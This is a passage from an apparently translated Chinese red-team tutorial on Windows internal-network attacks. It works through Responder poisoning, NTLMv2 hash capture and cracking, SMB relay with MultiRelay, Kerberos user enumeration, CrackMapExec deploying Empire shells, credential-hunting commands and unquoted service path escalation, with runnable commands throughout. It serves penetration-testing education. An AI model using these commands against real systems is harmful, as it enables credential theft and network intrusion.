LLMNR）和 Net-BIOS Name Service（NBT-NS）进行回退 DNS 名称解析。当受害者的电脑无法进行 DNS 查找时，
他就会开始询问网络上的任何人是否知道该主机名的解析方法。
一个简单而通用的例子：假设你电脑里有一个固定的共享硬盘驱动器目录，为：
\cyberspacekittenssecretdrive\secrets。有一天，IT 部门从网络中删除了共享驱动器，它就不存在了。但由于名为
cyberspacekittenssecretdrive 的服务器仍然有一个挂载的驱动器，因此系统将不断询问网络是否有人知道此驱动器
并回应它的 IP。虽然现在这种文件共享示例可能很少见，但是，由于以前连接的系统很可能不再存在于网络上，所以
这个问题仍然会发生。我们已经从已挂载的驱动器、具有硬编码服务器的应用程序以及许多次的错误配置中看到了这
一点。
我们可以使用像 Responder 这样的工具来利用那些寻找有主机名的系统，并使用我们的攻击服务器对其进行响应。
更好的是，Responder 可以更进一步，充当 WPAD（Web Proxy Auto-Discovery Protocol，Web 代理自动发现协
议）服务器，通过我们的攻击者服务器代理所有数据，但这是另一种攻击了。
cd /opt/Responder
./Responder.py -I eth0 –wrf
现在，因为我们处于 Windows 的企业环境中，我们可以假设它很可能正在运行 Active Directory（活动目录）。因
此，如果我们能够响应来自受害者主机的 DNS 查找请求，我们就可以使他们的系统连接到我们的 SMB 共享服务。
由于它们正在连接到 \cyberspacekittenssecretdrive 驱动器，因此我们将强制受害者使用他的 NTLMv2 凭证（或缓
存的凭证）进行身份验证。我们捕获的这些凭证不是直接的 NTLM 哈希，而是 NTLM 请求/响应哈希（NTLMv2-
SSP）。这些哈希表的唯一缺点是，破解它们的速度要比普通的 NTLM 哈希表要慢得多，但是相比于我们要进行的大
型凭证爆破动作来说，这不是一个大麻烦。
我们可以获取 NTLMv2哈希，将其传递给本地的 hashcat 程序破解此密码。在 hashcat 中，我们需要指定散列格式
“-m”（ https://hashcat.net/wiki/doku.php?id=example_hashes ）为 Net-NTLMv2 。
hashcat -m 5600 hashes\ntlmssp_hashes.txt passwordlists/*
现在，假设我们并不是真的想破解哈希，或者我们不介意提醒用户有一些值得可疑的地方。我们所能做的是强制一个
基本身份验证弹出窗口，而不是采用 -F （ForceWpadAuth）和 -b （basic auth）的要求使用 Net-NTLMv2凭据。
python ./Responder.py -I eth0 -wfFbv
从上面的图像中可以看到，用户将被提示输入用户名和密码，大多数人只是按部就班的按提示输入。一旦他们提交了
他们的用户名和密码，我们将能够捕获他们的密码明文!
更好的 Responder（MultiRelay.py）
使用 Responder 和破解 NTLMv2-SSP 哈希的问题是，破解这些哈希所需的时间可能很长。更糟糕的是，我们所处的
环境中的管理员的密码可能是20多个的字符。那么，在这些情况下我们能做什么呢？如果所处环境不强制执行 SMB
签名（ 我们可以通过快速的 nmap 脚本扫描找到 - https://nmap.org/nsedoc/scripts/smb-security-mode.html
），我们可以使用一个巧妙的小技巧来重新播放捕获的 SMB 请求。
Laurent Gaﬃe 在 Responder 中加入了一个处理身份验证重放攻击的工具。根据 Laurent 的网站描述，MultiRelay
是一个强大的渗透测试实用程序，包含在响应程序工具的文件夹中，使你能够在选定的目标上执行目标 NTLMv1 和
NTLMv2 中继器。目前已经实现多中继将 HTTP、WebDav、代理和 SMB 身份验证传递给 SMB 服务器。这个工具可
以定制为接受一系列用户账户信息来中继到一个目标。这背后的概念是只针对域管理员、本地管理员或特权帐
户。”[http://g-laurent.blogspot.com/2016/10/introducing-responder-multiray-10.html]
从较高的层面来看，MultiRelay 不会强制受害者对我们的 SMB 共享进行身份验证，而是将任何含有身份验证的请求
转发给我们选择的受害者主机。当然，中继用户需要有另一台机器的访问权限；如果攻击成功，我们不需要处理任何
密码和哈希破解。首先，我们需要配置我们的 Responder 和 MultiRelay：
编辑 Responder 配置文件以禁用 SMB 和 HTTP 服务器
编辑 Responder.conf
将 SMB 和 HTTP 更改为 Oﬀ
开始 Responder
python ./Responder.py -I eth0 -rv
在一个新的终端窗口中启动多中继
/opt/Responder/tools
./MultiRelay.py -t -c -u ALL
一旦可以实现通过中继连接到受害者主机，我们就需要考虑要在受害者的主机上执行什么操作。默认情况下，
MultiRelay 可以生成一个比较基础的 shell，但我们也可以自动执行 Meterpreter PowerShell payloads、Empire
PowerShell payloads、dnscat2 PowerShell payloads、PowerShell 脚本（用于下载和执行 C2代理)、Mimikatz，
或者只是运行 calc.exe 作为测试娱乐。
参考文献
http://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/
PowerShell Responder
一旦我们攻击进了 Windows 系统，我们就可以在受害者机器上使用 PowerShell 进行 Responder 攻击。原始
Responder 的两个功能都可以通过以下两个工具执行：
Inveigh - https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
Inveigh-Relay
更简单的是，这一切都已经集成在 Empire 中了。
没有凭据的用户枚举
一旦进入了内网中，我们可以使用 Responder 来获得凭证或 shell，但有时也会发现同时启用 SMB 签名和破解
NTLMv2 SSP 是没有实质进展的。那就是我们退一步，从更基础的开始。在不主动扫描网络的情况下，我们需要获得
一个用户列表（可能是用于密码爆破，甚至是内网钓鱼）。
一种选择是开始针对域控制器枚举用户。如果是早些时候（回到2003年），我们可以尝试执行 RID 循环来获得所有
用户帐户的列表。虽然现在不可用了，但爆破帐户还有其他选择。一种选择就是利用 Kerberos：
nmap -p88 --script krb5-enum-users --script-args krb5-enum-
users.realm=“cyberspacekittens.local”,userdb=/opt/userlist.txt
我们将需要提供一个要测试的用户名列表，但是由于我们只是查询 DC（域控制器）而没有对其进行身份验证，因此
通常此行动不会被检测。现在，我们可以采用这些用户帐户，并再次开始密码猜解!
使用 CrackMapExec（CME）扫描网络
如果我们还没有成功入侵进一个系统，但是我们确实通过 Responder、错误配置的 Web 应用程序、暴力破解或通过
打印机获得了登录凭证，那么我们可以尝试扫描网络，看看这个帐户可以登录到哪里。使用像
CrackMapExec（CME）这样的工具进行简单的扫描可以帮助找到内部网络上的初始入口点。
过去，我们使用 CME 扫描网络、通过网络上的 SMB 进行标识/身份验证、对许多主机远程执行命令，甚至通过
Mimikatz 提取明文凭证。Empire 和 CME 都拥有了一些新特性，我们可以利用 Empire 的 REST 特性。在下面的场
景中，我们将使用其 REST API 启动 Empire，在 CME 中配置密码，让 CME 连接到 Empire，使用我们拥有的单一凭
证扫描网络，最后，如果成功完成身份验证，则自动将 Empire 的 payload 推送到远程受害者的系统。如果你有一个
helpdesk 或高权限帐户，那就准备好加载 Empire shell 吧！
启动 Empire 的 REST API 服务器
cd /opt/Empire
./empire --rest --password ‘hacktheuniverse’
更改 CrackMapExec 密码
打开 /root/.cme/cme.conf
password=hacktheuniverse
运行 CME 来生成 Empire shells
cme smb 10.100.100.0/24 -d ‘cyberspacekittens.local’ -u ‘’ -p ‘’ -M empire_exec -o LISTENER=http
在攻陷你的第一台机器之后
当你通过社会工程、drop box、Responder、攻击打印机或通过其他攻击获得对主机的访问权限后，下一步要做什
么？这是一个非常重要的问题。
在过去，你需要做的一切，是了解你身在何处和周边的网络环境。我们可能首先运行类似于“netstat -ano”的命令来
查找受害者的服务器、域和用户的 IP 范围的位置。我们还可以运行命令，如 ps  或 sc queryex type= service
state= all | find “_NAME”  列出所有正在运行的服务，并寻找杀毒软件或其他主机基础保护。下面是一些我们最
初可能运行的其他示例命令：
网络信息:
netstat -anop | ﬁndstr LISTEN
net group “Domain Admins” /domain
流程列表:
tasklist /v
系统主机信息:
sysinfo
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
wmic qfe get Caption，Description，HotFixID，InstalledOn
简单的文件搜索:
dir /s password
ﬁndstr /s /n /i /p foo *
ﬁndstr /si pass *.txt | *.xml | *.ini
来自共享/挂载驱动器的信息:
powershell -Command “get-WmiObject -class Win32_Share”
powershell -Command “get-PSDrive”
powershell -Command “Get-WmiObject -Class Win32_MappedLogicalDisk | select Name，
ProviderName”
让我们现实一点，没有人有时间记住所有的命令，但是我们很幸运！我相信，我相信我们可以在一个名为 RTFM.py
的工具中轻松搜索到这些命令，这是 @leostat 基于 RTFM 书籍(很棒的资源)创建的一个快速查询的 Python 脚本，其
中包含大量这些方便的命令。
更新并运行 RTFM
cd /opt/rtfm
chmod +x rtfm.py
./rtfm.py -u
./rtfm.py -c ‘rtfm’
搜索所有标签
./rtfm.py -Dt
查看每个标记的所有查询/命令。我喜欢用的一个是枚举类
./rtfm.py -t enumeration | more
现在，RTFM 非常广泛，有许多不同的有用命令。这是一个不断快速更新的优秀的资源。
这些都是我们为了获取信息而一直在做的事情，但是如果我们能从环境中获得更多呢？使用 PowerShell，我们可以
获得所需的网络和环境信息。任何支持 C2 的工具都能轻松执行 PowerShell ，因此可以使用 Empire、Metasploit 或
Cobalt Strike 来执行这些操作。在下面的例子中，我们将使用 Empire ，你也可以尝试其他工具。
权限提升
从普通用户到高权限帐户有很多不同的方式。
未被引用服务路径:
这是一个相当简单和常见的漏洞，其中服务可执行路径没有被引号括起来。这是很容易被利用的，因为如果路
径周围没有引号，我们就会利用当前服务。假设我们有一个服务被配置为执行 C:\Program Files (x86)\Cyber
Kittens\Cyber Kittens.exe。如果我们有 CK 文件夹的写入权限，我们可以将其替换为 C:\Program Files
(x86)\Cyber Kittens\Cyber.exe（注意，原名称中的 Kittens.exe 消失了）的恶意软件。如果服务在系统上运
行，我们可以等到服务重新启动，并让我们的恶意软件作为一个 system  帐户运行。
如何找到易受攻击的服务路径:
通过 wmic 服务获取名称、注意 displayname、pathname、startmode |ﬁndstr /i "Auto" |ﬁndstr /i /v
"C:\Windows" | ﬁndstr /i /v """